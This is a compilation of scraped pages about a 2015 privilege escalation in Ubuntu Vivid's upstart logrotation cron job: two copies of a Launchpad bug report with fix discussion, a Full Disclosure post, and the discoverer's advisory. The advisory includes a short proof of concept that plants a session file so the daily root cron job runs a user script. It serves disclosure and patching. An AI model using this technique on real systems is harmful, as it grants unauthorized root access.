=== Content from bugs.launchpad.net_16b3e8a0_20250126_131015.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[upstart package](https://launchpad.net/ubuntu/%2Bsource/upstart)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/upstart)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/upstart)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/upstart)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/upstart)

# Missing input sanitation in upstart logrotation cronjob

Bug #1425685 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2015-02-25

[260](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [upstart (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart "Latest release: 1.13.2-0ubuntu21.1, uploaded to main on 2016-05-19 11:08:11.454076+00:00 by Dimitri John Ledkov (xnox), maintained by James Hunt (james-hunt)") | Fix Released | High | [James Hunt](https://launchpad.net/~jamesodhunt) |  |

### Bug Description

Ubuntu Vivid 1504 (development branch) installs an insecure upstart logrotation script which will read user-supplied data from /run/user/[uid]/upstart/sessions and pass then unsanitized to an env command. As user run directory is user-writable, the user may inject arbitrary commands into the logrotation script, which will be executed during daily cron job execution around midnight with root privileges.

Problematic part of /etc/cron.daily/upstart:

for session in /run/user/\*/upstart/sessions/\*

do

    env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true

done

On a system with e.g. libpam-systemd installed, standard login on TTY or via SSH will create the directory /run/user/[uid] writable to the user. By preparing a suitable session file, user supplied code will be run during the daily cron-jobs.

See [1] for more information.

# lsb\_release -rd

Description: Ubuntu Vivid Vervet (development branch)

Release: 15.04

# apt-cache policy upstart-bin

upstart-bin:

  Installed: 1.13.2-0ubuntu7

  Candidate: 1.13.2-0ubuntu7

  Version table:

 \*\*\* 1.13.2-0ubuntu7 0

        500 <http://archive.ubuntu.com/ubuntu/> vivid/main i386 Packages

        100 /var/lib/dpkg/status

[1] <http://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/>

## Related branches

[lp:~jamesodhunt/ubuntu/vivid/upstart/bug-1425685](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685)
![](/@@/merge-proposal-icon)
[Merged](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050)
into
[lp:ubuntu/vivid/upstart](https://code.launchpad.net/~ubuntu-branches/ubuntu/vivid/upstart/vivid)
at
[revision 1608](https://bazaar.launchpad.net/~ubuntu-branches/ubuntu/vivid/upstart/vivid/revision/1608)

[Colin Watson](https://launchpad.net/~cjwatson):
Approve
on 2015-02-26

[Dimitri John Ledkov](https://launchpad.net/~xnox):
Pending
requested
2015-02-26

Diff: [37 lines (+18/-2)](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050/%2Bpreview-diff/603246/%2Bfiles/preview.diff)2 files modifieddebian/changelog (+8/-0)
debian/upstart-bin.upstart.cron.daily (+10/-2)
[api](/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050/%2Bpreview-diff/603246)

[Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold)
on 2015-02-25

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt) wrote on 2015-02-26: |  |  | [#1](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/1) |
| --- | --- | --- | --- |

Note - this problem only affects vivid fwics. Further, it does not affect Touch (since that uses Upstart as PID 1).

Note - this problem only affects vivid fwics. Further, it does not affect Touch (since that uses Upstart as PID 1).

[James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt)
on 2015-02-26

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **assignee**: | nobody → James Hunt (jamesodhunt) |
| **importance**: | Undecided → High |

[James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt)
on 2015-02-26

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt) wrote on 2015-02-26: |  |  | [#2](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/2) |
| --- | --- | --- | --- |

Fixed in upstart 1.13.2-0ubuntu9, currently in the proposed pocket.

Fixed in upstart 1.13.2-0ubuntu9, currently in the proposed pocket.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2015-02-26: |  |  | [#3](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/3) |
| --- | --- | --- | --- |

This bug was fixed in the package upstart - 1.13.2-0ubuntu9

---------------

upstart (1.13.2-0ubuntu9) vivid; urgency=medium

\* debian/upstart-bin.upstart.cron.daily: Ensure the session uid matches that

    of the session file itself to stop a user forcing the logrotation of

    another users logs.

 -- James Hunt <email address hidden> Thu, 26 Feb 2015 14:35:41 +0000

This bug was fixed in the package upstart - 1.13.2-0ubuntu9
---------------
upstart (1.13.2-0ubuntu9) vivid; urgency=medium
\* debian/upstart-bin.upstart.cron.daily: Ensure the session uid matches that
of the session file itself to stop a user forcing the logrotation of
another users logs.
-- James Hunt <james.hunt@ubuntu.com> Thu, 26 Feb 2015 14:35:41 +0000

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jann Horn (jann-e)](https://launchpad.net/~jann-e) wrote on 2015-03-02: |  |  | [#4](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/4) |
| --- | --- | --- | --- |

I'm not sure whether this is the right place to write this, but those permission checks look really racy - both the file type test and the file owner UID check.

(Besides, I think that an attacker should be able to hardlink a file created by another user into his directory, which would also lead to a bypass of the UID equality check, but I'm not familiar enough with ubuntu to be able to say whether that attack is actually feasible.)

I'm not sure whether this is the right place to write this, but those permission checks look really racy - both the file type test and the file owner UID check.
(Besides, I think that an attacker should be able to hardlink a file created by another user into his directory, which would also lead to a bypass of the UID equality check, but I'm not familiar enough with ubuntu to be able to say whether that attack is actually feasible.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-03-13: |  |  | [#5](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/5) |
| --- | --- | --- | --- |

Jann, thanks for the comment; I believe the checks aren't strictly necessary; the grep command used to extract one specific variable with the given legal values is the more important part of this patch.

That said, /run/user is a filesystem in its own right, so cross-mount hardlinks aren't possible, and at least on my system, all the directories are mode 700, so hardlinking to another user's file on the filesystem will be difficult.

Have you thought of anything else in the meantime? Thanks

Jann, thanks for the comment; I believe the checks aren't strictly necessary; the grep command used to extract one specific variable with the given legal values is the more important part of this patch.
That said, /run/user is a filesystem in its own right, so cross-mount hardlinks aren't possible, and at least on my system, all the directories are mode 700, so hardlinking to another user's file on the filesystem will be difficult.
Have you thought of anything else in the meantime? Thanks

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/upstart/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from seclists.org_be42c8f0_20250126_003656.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# upstart logrotate privilege escalation in Ubuntu Vivid (development)

---

*From*: halfdog <me () halfdog net>

*Date*: Fri, 27 Feb 2015 08:06:20 +0000

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Although just reported to Ubuntu, this minor dev-branch issue was already made public. As the launchpad/lkml/...
feed-miners should not play all the games alone, and as others may want to learn how beginner errors still make it into
packages of quite large distributions, enjoy the power of

for session in /run/user/*/upstart/sessions/*
do
    env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true
done

executed as root. See [1]

hd

[1] <http://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/>

- --
<http://www.halfdog.net/>
PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iEYEARECAAYFAlTwJXEACgkQxFmThv7tq+4LKgCcCKMaOdO0xObIno415g6qZAxp
LZQAnj8giZDPkLYZPD/TVhY958/vXMSJ
=xyAX
-----END PGP SIGNATURE-----

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **upstart logrotate privilege escalation in Ubuntu Vivid (development)** *halfdog (Mar 01)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from packetstormsecurity.com_ca492d76_20250126_003654.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.halfdog.net_2bdbd983_20250126_003656.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2015](/Security/2015/) / UpstartLogrotationPrivilegeEscalation /

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity%2F2015%2FUpstartLogrotationPrivilegeEscalation%2F&t=Upstart%20Logrotation%20Privilege%20Escalation "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/ "google+")
# Introduction

## Problem description:

Ubuntu Vivid 1504 (development branch)
installs an insecure upstart logrotation script which will read
user-supplied data from */run/user/[uid]/upstart/sessions*
and pass then unsanitized to an *env* command. As user run
directory is user-writable, the user may inject arbitrary commands
into the logrotation script, which will be executed during daily
cron job execution around midnight with root privileges.

# Methods

The vulnerability is very easy to trigger as the logrotation
script */etc/cron.daily/upstart* does not perform any kind
of input sanitation:

#!/bin/sh
# For each Upstart Session Init, emit "rotate-logs" event, requesting
# the session Inits to rotate their logs. There is no user-daily cron.
#
# Doing it this way does not rely on System Upstart, nor
# upstart-event-bridge(8) running in the Session Init.
#
# Note that system-level Upstart logs are handled separately using a
# logrotate script.
[ -x /sbin/initctl ] || exit 0
for session in /run/user/\*/upstart/sessions/\*
do
env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true
done

On a system with e.g. libpam-systemd installed, standard login
on TTY or via SSH will create the directory */run/user/[uid]*
writable to the user. By preparing a suitable session file, user
supplied code will be run during the daily cron-jobs. Example:

cat <<EOF > "${HOME}/esc"
#!/bin/sh
touch /esc-done
EOF
chmod 0755 "${HOME}/esc"
mkdir -p /run/user/[uid]/upstart/sessions
echo "- ${HOME}/esc" > /run/user/[uid]/upstart/sessions/x

# Results, Discussion

# Timeline

* 20150225: Discovery, report at Launchpad, bug id [1425685](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685)
* 20150225: Issue made public on launchpad, forwarded to full disclosure
* 20150312: CVE assigned: [CVE-2015-2285](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2285) (development release bugs eligible for CVE?)
# Material, References

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from bugs.launchpad.net_24c840e6_20250126_003657.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[upstart package](https://launchpad.net/ubuntu/%2Bsource/upstart)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/upstart)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/upstart)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/upstart)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/upstart)

# Missing input sanitation in upstart logrotation cronjob

Bug #1425685 reported by
[halfdog](https://launchpad.net/~halfdog)
on 2015-02-25

[260](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [upstart (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart "Latest release: 1.13.2-0ubuntu21.1, uploaded to main on 2016-05-19 11:08:11.454076+00:00 by Dimitri John Ledkov (xnox), maintained by James Hunt (james-hunt)") | Fix Released | High | [James Hunt](https://launchpad.net/~jamesodhunt) |  |

### Bug Description

Ubuntu Vivid 1504 (development branch) installs an insecure upstart logrotation script which will read user-supplied data from /run/user/[uid]/upstart/sessions and pass then unsanitized to an env command. As user run directory is user-writable, the user may inject arbitrary commands into the logrotation script, which will be executed during daily cron job execution around midnight with root privileges.

Problematic part of /etc/cron.daily/upstart:

for session in /run/user/\*/upstart/sessions/\*

do

    env $(cat $session) /sbin/initctl emit rotate-logs >/dev/null 2>&1 || true

done

On a system with e.g. libpam-systemd installed, standard login on TTY or via SSH will create the directory /run/user/[uid] writable to the user. By preparing a suitable session file, user supplied code will be run during the daily cron-jobs.

See [1] for more information.

# lsb\_release -rd

Description: Ubuntu Vivid Vervet (development branch)

Release: 15.04

# apt-cache policy upstart-bin

upstart-bin:

  Installed: 1.13.2-0ubuntu7

  Candidate: 1.13.2-0ubuntu7

  Version table:

 \*\*\* 1.13.2-0ubuntu7 0

        500 <http://archive.ubuntu.com/ubuntu/> vivid/main i386 Packages

        100 /var/lib/dpkg/status

[1] <http://www.halfdog.net/Security/2015/UpstartLogrotationPrivilegeEscalation/>

## Related branches

[lp:~jamesodhunt/ubuntu/vivid/upstart/bug-1425685](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685)
![](/@@/merge-proposal-icon)
[Merged](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050)
into
[lp:ubuntu/vivid/upstart](https://code.launchpad.net/~ubuntu-branches/ubuntu/vivid/upstart/vivid)
at
[revision 1608](https://bazaar.launchpad.net/~ubuntu-branches/ubuntu/vivid/upstart/vivid/revision/1608)

[Colin Watson](https://launchpad.net/~cjwatson):
Approve
on 2015-02-26

[Dimitri John Ledkov](https://launchpad.net/~xnox):
Pending
requested
2015-02-26

Diff: [37 lines (+18/-2)](https://code.launchpad.net/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050/%2Bpreview-diff/603246/%2Bfiles/preview.diff)2 files modifieddebian/changelog (+8/-0)
debian/upstart-bin.upstart.cron.daily (+10/-2)
[api](/~jamesodhunt/ubuntu/vivid/upstart/bug-1425685/%2Bmerge/251050/%2Bpreview-diff/603246)

[Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold)
on 2015-02-25

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt) wrote on 2015-02-26: |  |  | [#1](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/1) |
| --- | --- | --- | --- |

Note - this problem only affects vivid fwics. Further, it does not affect Touch (since that uses Upstart as PID 1).

Note - this problem only affects vivid fwics. Further, it does not affect Touch (since that uses Upstart as PID 1).

[James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt)
on 2015-02-26

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **assignee**: | nobody → James Hunt (jamesodhunt) |
| **importance**: | Undecided → High |

[James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt)
on 2015-02-26

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **status**: | New → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [James Hunt (jamesodhunt)](https://launchpad.net/~jamesodhunt) wrote on 2015-02-26: |  |  | [#2](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/2) |
| --- | --- | --- | --- |

Fixed in upstart 1.13.2-0ubuntu9, currently in the proposed pocket.

Fixed in upstart 1.13.2-0ubuntu9, currently in the proposed pocket.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2015-02-26: |  |  | [#3](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/3) |
| --- | --- | --- | --- |

This bug was fixed in the package upstart - 1.13.2-0ubuntu9

---------------

upstart (1.13.2-0ubuntu9) vivid; urgency=medium

\* debian/upstart-bin.upstart.cron.daily: Ensure the session uid matches that

    of the session file itself to stop a user forcing the logrotation of

    another users logs.

 -- James Hunt <email address hidden> Thu, 26 Feb 2015 14:35:41 +0000

This bug was fixed in the package upstart - 1.13.2-0ubuntu9
---------------
upstart (1.13.2-0ubuntu9) vivid; urgency=medium
\* debian/upstart-bin.upstart.cron.daily: Ensure the session uid matches that
of the session file itself to stop a user forcing the logrotation of
another users logs.
-- James Hunt <james.hunt@ubuntu.com> Thu, 26 Feb 2015 14:35:41 +0000

| Changed in upstart (Ubuntu): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jann Horn (jann-e)](https://launchpad.net/~jann-e) wrote on 2015-03-02: |  |  | [#4](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/4) |
| --- | --- | --- | --- |

I'm not sure whether this is the right place to write this, but those permission checks look really racy - both the file type test and the file owner UID check.

(Besides, I think that an attacker should be able to hardlink a file created by another user into his directory, which would also lead to a bypass of the UID equality check, but I'm not familiar enough with ubuntu to be able to say whether that attack is actually feasible.)

I'm not sure whether this is the right place to write this, but those permission checks look really racy - both the file type test and the file owner UID check.
(Besides, I think that an attacker should be able to hardlink a file created by another user into his directory, which would also lead to a bypass of the UID equality check, but I'm not familiar enough with ubuntu to be able to say whether that attack is actually feasible.)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2015-03-13: |  |  | [#5](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/comments/5) |
| --- | --- | --- | --- |

Jann, thanks for the comment; I believe the checks aren't strictly necessary; the grep command used to extract one specific variable with the given legal values is the more important part of this patch.

That said, /run/user is a filesystem in its own right, so cross-mount hardlinks aren't possible, and at least on my system, all the directories are mode 700, so hardlinking to another user's file on the filesystem will be difficult.

Have you thought of anything else in the meantime? Thanks

Jann, thanks for the comment; I believe the checks aren't strictly necessary; the grep command used to extract one specific variable with the given legal values is the more important part of this patch.
That said, /run/user is a filesystem in its own right, so cross-mount hardlinks aren't possible, and at least on my system, all the directories are mode 700, so hardlinking to another user's file on the filesystem will be difficult.
Have you thought of anything else in the meantime? Thanks

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/upstart/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/upstart/%2Bbug/1425685/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


